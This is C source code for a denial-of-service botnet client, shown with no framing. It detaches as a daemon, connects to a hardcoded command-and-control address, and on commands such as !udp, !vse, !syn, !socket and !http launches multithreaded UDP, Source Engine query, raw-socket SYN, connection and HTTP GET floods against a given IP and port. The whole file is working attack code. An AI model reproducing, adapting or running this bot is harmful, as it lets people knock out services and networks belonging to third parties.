#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>

#define CNC_IP "1.1.1.1"
#define BOT_PORT 1024
#define MAX_THREADS 4

typedef struct {
    struct sockaddr_in target_addr;
    int duration;
    int active;
    int attack_type;
} attack_params;

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    umask(0);
    pid_t sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
    }
    if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

void* udp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    char data[32] = {0};
    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        sendto(udp_sock, data, sizeof(data), 0, (struct sockaddr*)&(params->target_addr), sizeof(params->target_addr));
    }
    close(udp_sock);
    return NULL;
}

void* vse_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    unsigned char vse_data[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75,
        0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x69,
        0x6E, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79,
        0x00
    };
    int udp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        sendto(udp_sock, vse_data, sizeof(vse_data), 0, (struct sockaddr*)&(params->target_addr), sizeof(params->target_addr));
    }
    close(udp_sock);
    return NULL;
}

void* syn_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    int syn_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    int one = 1;
    const int *val = &one;
    setsockopt(syn_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
    char packet[4096];
    memset(packet, 0, 4096);

    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = params->target_addr.sin_port;
    dest.sin_addr = params->target_addr.sin_addr;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    srand(time(NULL));
    iph->id = htonl(rand());
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("0.0.0.0");
    iph->daddr = params->target_addr.sin_addr.s_addr;

    srand(time(NULL));

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        int random_port = 1024 + rand() % (65536 - 1024);
        tcph->source = htons(random_port);

        tcph->dest = params->target_addr.sin_port;
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 1;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;

        sendto(syn_sock, packet, iph->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
    }
    close(syn_sock);
    return NULL;
}

void* socket_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    time_t end_time = time(NULL) + params->duration;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    while (params->active && time(NULL) < end_time) {
        connect(sock, (struct sockaddr*)&(params->target_addr), sizeof(params->target_addr));
    }
    close(sock);
    return NULL;
}

void* http_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    int sock;
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = params->target_addr.sin_port;
    target_addr.sin_addr = params->target_addr.sin_addr;

    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
    };

    srand(time(NULL));
    time_t end_time = time(NULL) + params->duration;

    while (params->active && time(NULL) < end_time) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
            char buffer[1024];
            const char* user_agent = user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))];
            snprintf(buffer, sizeof(buffer), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
                     inet_ntoa(params->target_addr.sin_addr), user_agent);
            send(sock, buffer, strlen(buffer), 0);
        }
    }
    close(sock);
    return NULL;
}


void handle_command(const char *command, int sock) {
    static attack_params* params = NULL;
    static pthread_t threads[MAX_THREADS];
    if (strcmp(command, "ping") == 0) {
        send(sock, "pong", strlen("pong"), 0);
    } else if (strncmp(command, "!udp", 4) == 0 || strncmp(command, "!vse", 4) == 0 || strncmp(command, "!syn", 4) == 0 || strncmp(command, "!socket", 7) == 0 || strncmp(command, "!http", 5) == 0) {
        char ip[20];
        int port, time;
        if (sscanf(command + 5, "%s %d %d", ip, &port, &time) == 3) {
            if (params != NULL) {
                params->active = 0;
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_cancel(threads[i]);
                }
                free(params);
            }
            params = malloc(sizeof(attack_params));
            params->target_addr.sin_family = AF_INET;
            params->target_addr.sin_port = htons(port);
            inet_pton(AF_INET, ip, &params->target_addr.sin_addr);
            params->duration = time;
            params->active = 1;

            if (strncmp(command, "!udp", 4) == 0) {
                params->attack_type = 1;
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, udp_attack, params);
                }
            } else if (strncmp(command, "!vse", 4) == 0) {
                params->attack_type = 2;
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, vse_attack, params);
                }
            } else if (strncmp(command, "!syn", 4) == 0) {
                params->attack_type = 3;
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, syn_attack, params);
                }
            } else if (strncmp(command, "!socket", 7) == 0) {
                params->attack_type = 4;
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, socket_attack, params);
                }
            } else if (strncmp(command, "!http", 5) == 0) {
                params->attack_type = 5;
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, http_attack, params);
                }
            }
            sleep(time);
            params->active = 0;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_cancel(threads[i]);
            }
            free(params);
            params = NULL;
        }
    } else if (strcmp(command, "stop") == 0) {
        if (params != NULL) {
            params->active = 0;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_cancel(threads[i]);
            }
            free(params);
            params = NULL;
        }
    }
}


int main() {
    daemonize();

    int sock;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);

    int attempts = 0;
    while (attempts < 8) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return 1;
        }

        int optval = 1;
        if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) {
            close(sock);
            return 1;
        }

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            attempts++;
            sleep(5);
            continue;
        }

        attempts = 0;

        char buffer[1024];
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            int len = recv(sock, buffer, sizeof(buffer), 0);
            if (len <= 0) {
                close(sock);
                break;
            }
            handle_command(buffer, sock);
        }
    }

    close(sock);
    return 0;
}

